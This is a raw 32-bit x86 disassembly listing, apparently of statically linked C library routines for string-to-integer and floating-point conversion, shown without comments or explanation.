mov dword [var_10h], 0
je 0x8085644
cmp dl, 0x2b
je 0x808563b
cmp dl, 0x30
je 0x8085603
test esi, esi
mov eax, 0xa
cmove esi, eax
cmp esi, 0xa
mov eax, 0
mov dword [var_28h], edi
cmove eax, dword [var_3ch]
mov dword [var_2ch], 0
test eax, eax
mov dword [var_3ch], eax
jne 0x808554f
mov edx, dword [esi*8 + 0x80a5f14]
mov eax, dword [esi*8 + 0x80a5f10]
mov dword [var_30h], 0
mov ecx, dword [esi*4 + 0x8092858]
mov dword [var_14h], edx
mov dword [var_18h], eax
movzx edx, byte [esi + 0x80a603e]
mov dword [var_1ch], edx
movzx ebx, byte [edi]
mov dword [var_40h], ecx
mov dword [var_60h], 0
test bl, bl
je 0x80852cf
cmp edi, dword [var_2ch]
je 0x80852cf
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x80854df
mov ebx, eax
movzx edx, bl
cmp edx, esi
jge 0x80852cf
mov eax, dword [var_40h]
cmp dword [var_60h], eax
jae 0x80853ba
mov eax, dword [var_60h]
imul eax, esi
add eax, edx
mov dword [var_60h], eax
inc edi
movzx ebx, byte [edi]
test bl, bl
jne 0x8085297
mov edx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], edx
cmp edi, dword [var_28h]
je 0x8085370
mov eax, dword [arg_ch]
test eax, eax
je 0x80852f1
mov ebx, dword [arg_ch]
mov dword [ebx], edi
mov eax, dword [var_30h]
test eax, eax
jne 0x808533b
mov edi, dword [var_10h]
test edi, edi
je 0x8085367
cmp dword [var_20h], 0x80000000
ja 0x8085310
jb 0x8085317
cmp dword [var_24h], 0
jbe 0x8085317
mov dword [var_30h], 1
mov esi, dword [var_30h]
test esi, esi
jne 0x808533b
mov ecx, dword [var_10h]
mov eax, dword [var_24h]
mov edx, dword [var_20h]
test ecx, ecx
je 0x80851cf
neg eax
adc edx, 0
neg edx
jmp 0x80851cf
call fcn.08048b20
mov ebx, dword [var_10h]
mov edx, 0x80000000
mov dword [eax], 0x22
xor eax, eax
test ebx, ebx
jne 0x80851cf
mov eax, 0xffffffff
mov edx, 0x7fffffff
jmp 0x80851cf
cmp dword [var_20h], 0x7fffffff
jmp 0x808530e
mov eax, dword [arg_ch]
test eax, eax
je 0x80851cb
mov eax, dword [var_28h]
sub eax, dword [arg_8h]
dec eax
jle 0x8085397
mov eax, dword [var_28h]
mov ecx, dword [arg_18h]
movsx edx, byte [eax - 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
je 0x80853a4
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov dword [ecx], ebx
jmp 0x80851cb
mov ebx, dword [var_28h]
cmp byte [ebx - 2], 0x30
jne 0x8085397
mov edx, dword [arg_ch]
mov eax, ebx
dec eax
mov dword [edx], eax
jmp 0x80851cb
mov ecx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], ecx
mov eax, esi
mov dword [var_58h], esi
sar eax, 0x1f
mov dword [var_54h], eax
mov eax, dword [var_24h]
mul dword [var_58h]
mov dword [var_44h], edx
mov dword [var_48h], eax
mov edx, dword [var_24h]
imul edx, dword [var_54h]
mov eax, dword [var_44h]
mov ecx, dword [var_48h]
add eax, edx
mov edx, dword [var_58h]
imul edx, dword [var_20h]
mov dword [var_20h], 0
add eax, edx
mov dword [var_44h], eax
movzx eax, bl
mov ebx, dword [var_44h]
mov dword [var_24h], eax
add dword [var_24h], ecx
adc dword [var_20h], ebx
nop
inc edi
movzx ebx, byte [edi]
test bl, bl
je 0x80852dc
cmp edi, dword [var_2ch]
je 0x80852dc
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x8085471
mov ebx, eax
movzx ecx, bl
cmp ecx, esi
jge 0x80852dc
mov eax, dword [var_14h]
cmp dword [var_20h], eax
ja 0x8085468
jb 0x808544b
mov edx, dword [var_18h]
cmp dword [var_24h], edx
ja 0x8085468
mov edx, dword [var_20h]
mov eax, dword [var_24h]
xor edx, dword [var_14h]
xor eax, dword [var_18h]
or edx, eax
jne 0x80853c7
cmp ecx, dword [var_1ch]
jbe 0x80853c7
mov dword [var_30h], 1
jmp 0x8085410
mov eax, dword [var_38h]
test eax, eax
je 0x80854c6
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085492
nop
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085492
inc edx
cmp edx, dword [var_38h]
jb 0x8085480
cmp edx, dword [var_38h]
je 0x80854ba
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852dc
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x808542e
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x8085410
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852dc
mov eax, dword [ebx + 0x3c]
jmp 0x80854ae
mov eax, dword [var_38h]
test eax, eax
je 0x8085536
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085502
lea esi, [esi]
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085502
inc edx
cmp edx, dword [var_38h]
jb 0x80854f0
cmp edx, dword [var_38h]
je 0x808552a
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852cf
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x80852a9
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x80852c7
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852cf
mov eax, dword [ebx + 0x3c]
jmp 0x808551e
mov ebx, dword [var_34h]
mov dword [esp], ebx
call fcn.08053400
xor edx, edx
mov dword [var_2ch], edi
mov dword [var_38h], eax
mov dword [var_60h], eax
cmp edx, dword [var_38h]
jae 0x808557c
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x808557c
inc edx
cmp edx, dword [var_60h]
jb 0x808556a
cmp edx, dword [var_60h]
jae 0x808525a
movzx ebx, byte [edi]
test bl, bl
je 0x80855de
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x80855d1
xor edx, edx
cmp edx, dword [var_60h]
jae 0x80855af
mov eax, dword [var_2ch]
mov ecx, dword [var_34h]
movzx eax, byte [edx + eax]
cmp byte [edx + ecx], al
jne 0x80855af
inc edx
cmp edx, dword [var_60h]
jb 0x808559a
cmp edx, dword [var_60h]
jae 0x80855d1
movzx edx, bl
mov ebx, dword [var_50h]
test byte [ebx + edx*2 + 1], 4
je 0x80855de
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x3c]
mov eax, dword [eax + edx*4]
sub eax, 0x37
cmp eax, esi
jge 0x80855de
inc dword [var_2ch]
mov eax, dword [var_2ch]
movzx ebx, byte [eax]
test bl, bl
jne 0x808558c
mov edx, dword [var_3ch]
mov ecx, dword [var_34h]
mov dword [esp], edi
mov ebx, dword [var_2ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], ebx
call fcn.08049980
mov dword [var_2ch], eax
jmp 0x808525a
test esi, esi
je 0x808561e
cmp esi, 0x10
je 0x808561e
test esi, esi
jne 0x8085239
mov esi, 8
jmp 0x8085239
mov ecx, dword [arg_18h]
movsx edx, byte [edi + 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
jne 0x808560c
add edi, 2
mov esi, 0x10
jmp 0x8085239
inc edi
movzx edx, byte [edi]
jmp 0x8085226
mov dword [var_10h], 1
jmp 0x808563b
mov ebx, dword [arg_8h]
movzx edx, byte [ebx]
jmp 0x8085205
mov ecx, dword [eax + 0x2c]
mov dword [var_3ch], ecx
movzx edx, byte [ecx]
test dl, dl
jle 0x80851ab
cmp dl, 0x7f
je 0x80851ab
mov eax, dword [eax + 0x28]
mov dword [var_34h], eax
cmp byte [eax], 0
jne 0x80851b2
mov dword [var_34h], 0
jmp 0x80851ab
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08085180
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x64
mov dword [var_38h], 0
mov dword [var_34h], 0
mov edx, dword [arg_18h]
mov esi, dword [arg_10h]
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
test edx, edx
jne 0x8085b58
mov dword [var_3ch], 0
test esi, esi
js 0x8085700
cmp esi, 1
je 0x8085700
cmp esi, 0x24
jle 0x8085717
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
xor edx, edx
add esp, 0x64
pop ebx
pop esi
pop edi
leave
ret
mov edi, dword [arg_8h]
mov ebx, dword [arg_18h]
mov dword [var_28h], edi
mov ebx, dword [ebx + 0x34]
movsx eax, byte [edi]
mov dword [var_50h], ebx
test byte [ebx + eax*2 + 1], 0x20
je 0x8085b4d
inc edi
mov ecx, dword [var_50h]
movzx edx, byte [edi]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x8085734
test dl, dl
je 0x808586b
cmp dl, 0x2d
mov dword [var_10h], 0
je 0x8085b44
cmp dl, 0x2b
je 0x8085b3b
cmp dl, 0x30
je 0x8085b03
test esi, esi
mov eax, 0xa
cmove esi, eax
cmp esi, 0xa
mov eax, 0
mov dword [var_28h], edi
cmove eax, dword [var_3ch]
mov dword [var_2ch], 0
test eax, eax
mov dword [var_3ch], eax
jne 0x8085a4f
mov edx, dword [esi*8 + 0x80a5f14]
mov eax, dword [esi*8 + 0x80a5f10]
mov dword [var_30h], 0
mov ecx, dword [esi*4 + 0x8092858]
mov dword [var_14h], edx
mov dword [var_18h], eax
movzx edx, byte [esi + 0x80a603e]
mov dword [var_1ch], edx
movzx ebx, byte [edi]
mov dword [var_40h], ecx
mov dword [var_60h], 0
test bl, bl
je 0x808580f
cmp edi, dword [var_2ch]
je 0x808580f
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x80859df
mov ebx, eax
movzx edx, bl
cmp edx, esi
jge 0x808580f
mov eax, dword [var_40h]
cmp dword [var_60h], eax
jae 0x80858b5
mov eax, dword [var_60h]
imul eax, esi
add eax, edx
mov dword [var_60h], eax
inc edi
movzx ebx, byte [edi]
test bl, bl
jne 0x80857d7
mov edx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], edx
cmp edi, dword [var_28h]
je 0x808586b
mov esi, dword [arg_ch]
test esi, esi
je 0x808582d
mov ebx, dword [arg_ch]
mov dword [ebx], edi
mov ebx, dword [var_30h]
test ebx, ebx
jne 0x8085851
mov ecx, dword [var_10h]
mov eax, dword [var_24h]
mov edx, dword [var_20h]
test ecx, ecx
je 0x808570f
neg eax
adc edx, 0
neg edx
jmp 0x808570f
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0x22
mov eax, 0xffffffff
jmp 0x808570f
mov eax, dword [arg_ch]
test eax, eax
je 0x808570b
mov eax, dword [var_28h]
sub eax, dword [arg_8h]
dec eax
jle 0x8085892
mov eax, dword [var_28h]
mov ecx, dword [arg_18h]
movsx edx, byte [eax - 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
je 0x808589f
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov dword [ecx], ebx
jmp 0x808570b
mov ebx, dword [var_28h]
cmp byte [ebx - 2], 0x30
jne 0x8085892
mov edx, dword [arg_ch]
mov eax, ebx
dec eax
mov dword [edx], eax
jmp 0x808570b
mov ecx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], ecx
mov eax, esi
mov dword [var_58h], esi
sar eax, 0x1f
mov dword [var_54h], eax
mov eax, dword [var_24h]
mul dword [var_58h]
mov dword [var_44h], edx
mov dword [var_48h], eax
mov edx, dword [var_24h]
imul edx, dword [var_54h]
mov eax, dword [var_44h]
mov ecx, dword [var_48h]
add eax, edx
mov edx, dword [var_58h]
imul edx, dword [var_20h]
mov dword [var_20h], 0
add eax, edx
mov dword [var_44h], eax
movzx eax, bl
mov ebx, dword [var_44h]
mov dword [var_24h], eax
add dword [var_24h], ecx
adc dword [var_20h], ebx
lea esi, [esi]
inc edi
movzx ebx, byte [edi]
test bl, bl
je 0x808581c
cmp edi, dword [var_2ch]
je 0x808581c
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x8085971
mov ebx, eax
movzx ecx, bl
cmp ecx, esi
jge 0x808581c
mov eax, dword [var_14h]
cmp dword [var_20h], eax
ja 0x8085968
jb 0x808594b
mov edx, dword [var_18h]
cmp dword [var_24h], edx
ja 0x8085968
mov edx, dword [var_20h]
mov eax, dword [var_24h]
xor edx, dword [var_14h]
xor eax, dword [var_18h]
or edx, eax
jne 0x80858c2
cmp ecx, dword [var_1ch]
jbe 0x80858c2
mov dword [var_30h], 1
jmp 0x8085910
mov eax, dword [var_38h]
test eax, eax
je 0x80859c6
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085992
nop
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085992
inc edx
cmp edx, dword [var_38h]
jb 0x8085980
cmp edx, dword [var_38h]
je 0x80859ba
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808581c
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x808592e
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x8085910
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808581c
mov eax, dword [ebx + 0x3c]
jmp 0x80859ae
mov eax, dword [var_38h]
test eax, eax
je 0x8085a36
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085a02
lea esi, [esi]
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085a02
inc edx
cmp edx, dword [var_38h]
jb 0x80859f0
cmp edx, dword [var_38h]
je 0x8085a2a
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808580f
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x80857e9
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x8085807
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808580f
mov eax, dword [ebx + 0x3c]
jmp 0x8085a1e
mov ebx, dword [var_34h]
mov dword [esp], ebx
call fcn.08053400
xor edx, edx
mov dword [var_2ch], edi
mov dword [var_38h], eax
mov dword [var_60h], eax
cmp edx, dword [var_38h]
jae 0x8085a7c
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085a7c
inc edx
cmp edx, dword [var_60h]
jb 0x8085a6a
cmp edx, dword [var_60h]
jae 0x808579a
movzx ebx, byte [edi]
test bl, bl
je 0x8085ade
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x8085ad1
xor edx, edx
cmp edx, dword [var_60h]
jae 0x8085aaf
mov eax, dword [var_2ch]
mov ecx, dword [var_34h]
movzx eax, byte [edx + eax]
cmp byte [edx + ecx], al
jne 0x8085aaf
inc edx
cmp edx, dword [var_60h]
jb 0x8085a9a
cmp edx, dword [var_60h]
jae 0x8085ad1
movzx edx, bl
mov ebx, dword [var_50h]
test byte [ebx + edx*2 + 1], 4
je 0x8085ade
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x3c]
mov eax, dword [eax + edx*4]
sub eax, 0x37
cmp eax, esi
jge 0x8085ade
inc dword [var_2ch]
mov eax, dword [var_2ch]
movzx ebx, byte [eax]
test bl, bl
jne 0x8085a8c
mov edx, dword [var_3ch]
mov ecx, dword [var_34h]
mov dword [esp], edi
mov ebx, dword [var_2ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], ebx
call fcn.08049980
mov dword [var_2ch], eax
jmp 0x808579a
test esi, esi
je 0x8085b1e
cmp esi, 0x10
je 0x8085b1e
test esi, esi
jne 0x8085779
mov esi, 8
jmp 0x8085779
mov ecx, dword [arg_18h]
movsx edx, byte [edi + 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
jne 0x8085b0c
add edi, 2
mov esi, 0x10
jmp 0x8085779
inc edi
movzx edx, byte [edi]
jmp 0x8085766
mov dword [var_10h], 1
jmp 0x8085b3b
mov ebx, dword [arg_8h]
movzx edx, byte [ebx]
jmp 0x8085745
mov ecx, dword [eax + 0x2c]
mov dword [var_3ch], ecx
movzx edx, byte [ecx]
test dl, dl
jle 0x80856eb
cmp dl, 0x7f
je 0x80856eb
mov eax, dword [eax + 0x28]
mov dword [var_34h], eax
cmp byte [eax], 0
jne 0x80856f2
mov dword [var_34h], 0
jmp 0x80856eb
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.080856c0
leave
ret
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085c00
mov dword [esp], 3
call section.
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08086280
leave
ret
lea esi, [esi]
mov eax, dword [0x80a9ab4]
jmp 0x8085bdb
mov esi, esi
lea edi, [edi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085c4b
mov dword [esp], 3
call section.
mov dword [esp + 0xc], eax
mov dword [esp + 8], 0
mov eax, dword [ebp + 0xc]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.08086280
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8085c2b
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085cc0
mov dword [esp], 3
call section.
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08088130
leave
ret
lea esi, [esi]
mov eax, dword [0x80a9ab4]
jmp 0x8085c9b
mov esi, esi
lea edi, [edi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085d0b
mov dword [esp], 3
call section.
mov dword [esp + 0xc], eax
mov dword [esp + 8], 0
mov eax, dword [ebp + 0xc]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.08088130
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8085ceb
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085d80
mov dword [esp], 3
call section.
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808a440
leave
ret
lea esi, [esi]
mov eax, dword [0x80a9ab4]
jmp 0x8085d5b
mov esi, esi
lea edi, [edi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085dcb
mov dword [esp], 3
call section.
mov dword [esp + 0xc], eax
mov dword [esp + 8], 0
mov eax, dword [ebp + 0xc]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.0808a440
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8085dab
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov edi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov edx, dword [arg_10h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
cmp ebx, 0xffffff82
mov eax, dword [arg_18h]
mov dword [var_14h], edx
mov dword [var_1ch], eax
jge 0x8085f28
mov esi, 0xffffff82
sub esi, ebx
cmp esi, 0x18
jg 0x8086048
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, edi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne edi, edx
cmp esi, 0x18
je 0x8086021
cmp esi, 0x1f
jle 0x8085feb
mov ecx, esi
lea eax, [esi + 0x1e]
mov edx, dword [var_10h]
dec ecx
cmovns eax, ecx
mov ebx, ecx
sar eax, 5
mov edx, dword [edx + eax*4]
shl eax, 5
sub ebx, eax
mov dword [var_1ch], ebx
mov dword [var_18h], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [esi + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x8085eb3
mov ebx, dword [var_10h]
mov eax, edi
or eax, 1
mov ebx, dword [ebx + edx*4]
test ebx, ebx
cmovne edi, eax
inc edx
jmp 0x8085e90
movzx ecx, byte [var_1ch]
mov ebx, 1
mov edx, edi
mov eax, ebx
or edx, 1
shl eax, cl
mov ecx, esi
dec eax
test dword [var_18h], eax
lea eax, [esi + 0x1f]
cmovne edi, edx
cmp esi, 0xffffffff
cmovg eax, esi
sar eax, 5
mov edx, eax
shl edx, 5
sub ecx, edx
mov dword [var_ch], ecx
mov ecx, ebx
sub ecx, eax
mov dword [var_8h], ecx
mov ebx, dword [var_10h]
lea eax, [ebx + eax*4]
mov dword [esp], ebx
mov dword [var_sp_4h], eax
call fcn.0808c750
xor edx, edx
cmp esi, 0xffffffff
lea eax, [esi + 0x1f]
cmovg eax, esi
sar eax, 5
cmp edx, eax
jge 0x8085f23
mov ebx, dword [var_10h]
mov ecx, edx
inc edx
sub ecx, eax
mov dword [ebx + ecx*4 + 4], 0
jmp 0x8085f01
mov ebx, 0xffffff81
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x8085f68
test edi, edi
jne 0x8085fe1
mov eax, dword [var_10h]
mov edx, dword [eax]
test dl, 1
jne 0x8085f54
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x8085f68
lea eax, [edx + 1]
mov edx, dword [var_10h]
test eax, 0x1000000
mov dword [edx], eax
jne 0x8085fb9
cmp ebx, 0xffffff81
je 0x8085faa
cmp ebx, 0x80
jle 0x8085f8f
mov edx, dword [var_14h]
mov eax, 0x7f800000
test edx, edx
cmovne eax, dword [0x80a6100]
mov dword [var_20h], eax
fld dword [ebp - 0x20]
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_ch], ebx
mov dword [arg_10h], eax
mov dword [arg_8h], edx
add esp, 0x24
pop ebx
pop esi
pop edi
leave
jmp 0x808d830
test eax, 0x800000
mov eax, 0xffffff82
cmovne ebx, eax
jmp 0x8085f68
mov dword [var_ch], 1
mov dword [var_8h], 1
mov dword [var_sp_4h], edx
mov dword [esp], edx
inc ebx
call fcn.0808c750
mov ecx, dword [var_10h]
or dword [ecx], 0x800000
jmp 0x8085f68
mov eax, dword [var_10h]
mov edx, dword [eax]
jmp 0x8085f54
test esi, esi
jle 0x8085f23
mov eax, dword [var_10h]
lea edx, [esi - 1]
mov dword [var_1ch], edx
mov eax, dword [eax]
mov dword [var_18h], eax
mov dword [var_8h], 1
mov dword [var_ch], esi
mov ecx, dword [var_10h]
mov dword [var_sp_4h], ecx
mov dword [esp], ecx
call fcn.0808c750
jmp 0x8085f23
mov ebx, dword [var_10h]
mov eax, edi
mov dword [var_1ch], 0x17
or eax, 1
mov ebx, dword [ebx]
test ebx, ebx
mov dword [var_18h], ebx
cmovne edi, eax
mov eax, dword [var_10h]
mov dword [eax], 0
jmp 0x8085f23
call fcn.08048b20
mov dword [eax], 0x21
mov eax, 0
jmp 0x8085f81
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x80861d9
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x80860ab
mov eax, dword [arg_24h]
test eax, eax
je 0x80860a5
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808619f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x8086080
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x8086193
lea edx, [eax + edi]
cmp edx, 9
jg 0x8086193
imul esi, dword [eax*4 + 0x80a6080]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a6080]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x8086110
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8086179
dec ecx
je 0x808615d
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8086179
dec ecx
jne 0x808614b
mov eax, 1
add dword [var_14h], eax
je 0x8086106
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8086106
cmp esi, edi
je 0x808618f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808618f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8086184
xor eax, eax
jmp 0x8086162
mov edx, dword [edi*4 + 0x80a6080]
jmp 0x80860f2
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x80861d0
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x80861c1
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x80861b0
test al, al
jne 0x80860a5
add ebx, edx
jmp 0x80860a8
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x80861c1
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x80861f6
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x8086089
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8086263
dec ecx
je 0x8086247
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8086263
dec ecx
jne 0x8086235
mov eax, 1
add dword [var_10h], eax
je 0x80861ed
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x80861ed
cmp esi, edi
je 0x808627b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808627b
mov esi, esi
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8086270
xor eax, eax
jmp 0x808624c
nop
